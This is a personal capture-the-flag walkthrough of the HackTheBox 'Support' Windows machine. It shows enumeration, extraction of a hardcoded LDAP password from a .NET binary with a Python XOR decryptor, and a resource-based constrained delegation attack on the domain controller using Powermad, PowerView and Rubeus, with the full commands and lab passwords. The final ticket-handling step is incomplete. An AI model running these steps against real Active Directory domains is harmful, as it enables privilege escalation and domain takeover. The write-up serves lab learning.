---
tags:
  - HTB
  - Retired
  - Windows
  - binary
  - BinaryAnalysis
  - RBCD
creation date: 2022-07-30
Date Completed: ""
CVEs: 
URL: 
IP: 10.129.123.182
New Tools: dnSpy, netexec, powermad
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-31 17:30:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```



53 - nothing
88 - with a list of usernames (and no passwords) you can check if "No preauth" is required using GetNPUsers.py

GetNPUsers.py support.htb/ -request -no-pass -usersfile users -dc-ip 10.129.123.182 -outputfile npusers -format hashcat


135
### 139

```
smbclient -N \\\\10.129.123.182\\support-tools
```

* use dnspy to analyze binaries *

389
### 593
```
rpcclient \\\\10.129.123.182 -U ''
lookupnames administrator
administrator S-1-5-21-1677581083-3380853377-188903654-500
```

```
impacket-lookupsid guest@10.129.123.182
nxc smb 10.129.123.182 -u 'anonymous' -p '' --rid-brute
```
    
#### Cleaning up with grep and cut 
    
```
impacket-lookupsid guest@10.129.123.182 | grep -i SidTypeUser | cut -d ' ' -f 2 
SUPPORT\ford.victoria

impacket-lookupsid guest@10.129.123.182 | grep -i SidTypeUser | cut -d ' ' -f 2 | cut -d '\' -f 2
ford.victoria
```

```
Administrator
Guest
krbtgt
DC$
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
```

636
3268
3269
5985

NetExec https://github.com/BlWasp/NetExec-Cheatsheet


# Binary Exploitation

dnSpy > open UserInfo.exe
look around

![[Pasted image 20241101083315.png]]
```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### Creating a Script to decrypt enc_password
Took the code above and asked Gemini to convert it to Python - it did its best but I had to spend time debugging it. Below is the code that ultimately worked:

```
import base64
import secrets  # for generating a secure key

# Encoded password (replace with your actual encoded password)
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"

# Generate a random key (replace with a secure key if you have one)
key =  "armando".encode('ascii')  # Generate 8 bytes for the key

def get_password():
  """Decodes and decrypts the password"""
  # Decode the Base64 encoded password
  password_bytes = base64.b64decode(enc_password)

  # Decrypt the password using XOR operation
  decrypted_bytes = bytearray(len(password_bytes))
  for i in range(len(password_bytes)):
    decrypted_bytes[i] = password_bytes[i] ^ key[i % len(key)] ^ 223

  # Convert the decrypted bytes back to a string
  return decrypted_bytes.decode()

# Example usage
password = get_password()
print(f"Decrypted password: {password}")
```

![[Pasted image 20241101092512.png]]

## Password Spray with NetExec

![[Pasted image 20241101092238.png]]
```
support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

# More Enumeration
## SMB Enumeration as ldap
```
smbclient \\\\10.129.123.182\\SYSVOL -U 'support.htb\ldap'
```

## Password Policy
GptTmpl.inf
![[Pasted image 20241101094428.png]]

## AD Enumeration

```
ldapsearch -x -H ldap://10.129.123.182 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -x -b "DC=SUPPORT,DC=HTB" -s sub "(&(objectclass=user))" | grep sAMAccountName 

ldapsearch -x -H ldap://10.129.123.182 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -x -b "DC=SUPPORT,DC=HTB" -s sub "(&(objectclass=user))" | grep description
```

```
ldapsearch -x -H ldap://10.129.123.182 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -x -b "DC=SUPPORT,DC=HTB" -s sub "(&(objectclass=user))"
```

not much... also tried GetUserSPNs.py and got nothing.. moving on

## Bloodhound

```
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -dc dc.support.htb -ns 10.129.123.182 -c All
```

```
sudo neo4j start
```
neo4j:bloodhound

operatingSystem: Windows Server 2022 Standard
operatingSystemVersion: 10.0 (20348)

with ldap we cannot:
psexec
winrm
see anything new on smb

# Foothold

```
ldapsearch -x -H ldap://10.129.123.182 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -x -b "DC=SUPPORT,DC=HTB" -s sub "(&(objectclass=user))"
```

![[Pasted image 20241101112444.png]]

```
Ironside47pleasure40Watchful
```

![[Pasted image 20241101112613.png]]

# Internal Recon

According to bloodhound support is a member of "Shared Support Accounts" which has GenericAll over DC.SUPPORT.HTB which will allow us to perform a resource based constrained delegation attack.

![[Pasted image 20241101113306.png]]

## Resource Based Constrained Delegation Attack


Abusing this primitive is possible through the Rubeus project.
https://github.com/Kevin-Robertson/Powermad
First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:

```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:

```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:

```
Rubeus.exe hash /password:Summer2018!
```

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

```
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```

### Doing it
```
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```
whoami /all
	shows i'm a member of Shared Support Accounts

upload ../Downloads/Powermad.ps1
Set-ExecutionPolicy -Scope process Bypass
Import-Module ./Powermad.ps1
```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

upload ../../opt/tools/PowerSploit/Recon/PowerView.ps1
Import-Module ./PowerView.ps1

```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

![[Pasted image 20241101115100.png]]

```
./Rubeus.exe hash /password:Summer2018!
```

![[Pasted image 20241101115100.png]]

![[Pasted image 20241101115037.png]]


```
./Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```


![[Pasted image 20241101145642.png]]


![[Pasted image 20241101145624.png]]

I tried and tried and could not get this to work so I'm going to look through HTB lesson on RBCD...

# Priv Esc using Hack The Box method

```powershell-session

Import-Module .\PowerView.ps1

New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)

$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

$credentials = New-Object System.Management.Automation.PSCredential "SUPPORT.HTB\support", (ConvertTo-SecureString "Ironside47pleasure40Watchful" -AsPlainText -Force)

Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
```

![[Pasted image 20241101154305.png]]

```powershell-session
.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:support.htb
```

![[Pasted image 20241101154359.png]]

```powershell-session
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

![[Pasted image 20241101154511.png]]

![[Pasted image 20241101154540.png]]

NOTE: i tried and tried and could not get this to work. Rubeus kept showing the ticket was imported but i could not browse `\\dc.support.htb\c$` it kept saying it doesn't exist. So I decided to check out 0xdf's blog... turns out he had the same problem. So he did the following:

```
# clean up the dirti_kirbi

echo "dirti_kirbi" | tr -d ' ' > dirti_kirbi
echo "dirti_kirbi" | tr -d \\n > admin.kirbi
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

![[Pasted image 20241101155406.png]]


# Notes

Okay for real. you HAVE to pay attention... Going back through LDAP query there was info you completely overlooked... ATTENTION TO DETAIL!!
